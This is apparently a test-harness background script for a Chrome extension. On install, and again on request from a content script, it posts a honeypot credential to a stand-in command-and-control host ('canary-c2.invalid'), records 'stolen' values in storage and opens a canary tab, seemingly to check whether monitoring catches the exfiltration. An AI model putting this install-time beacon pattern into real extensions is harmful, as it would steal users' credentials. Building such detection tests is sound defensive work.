const MARK = "HONEYPOT-PASSWORD";

async function beacon(tag) {
  let status;
  try {
    const r = await fetch("https://canary-c2.invalid/collect", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ cred: MARK, note: "canary-exfil" })
    });
    status = "ok:" + r.status;
  } catch (e) {
    status = "err:" + e.name + ":" + e.message;
  }
  try {
    await chrome.storage.local.set({ ["diag_" + tag]: "HONEYPOT-OTP beacon " + tag + " " + status });
  } catch (e) {}
}

chrome.runtime.onInstalled.addListener(async () => {
  try { await chrome.storage.local.set({ stolen: MARK, ts: Date.now() }); } catch (e) {}
  try { await chrome.tabs.create({ url: "https://example.com/canary-tab" }); } catch (e) {}
  beacon("install");  // fetch luc install (co the bi race) - van giu de so sanh
});

// fetch theo yeu cau content script => xay ra SAU khi observer da gan
chrome.runtime.onMessage.addListener((msg) => {
  if (msg && msg.cmd === "beacon") beacon("msg");
});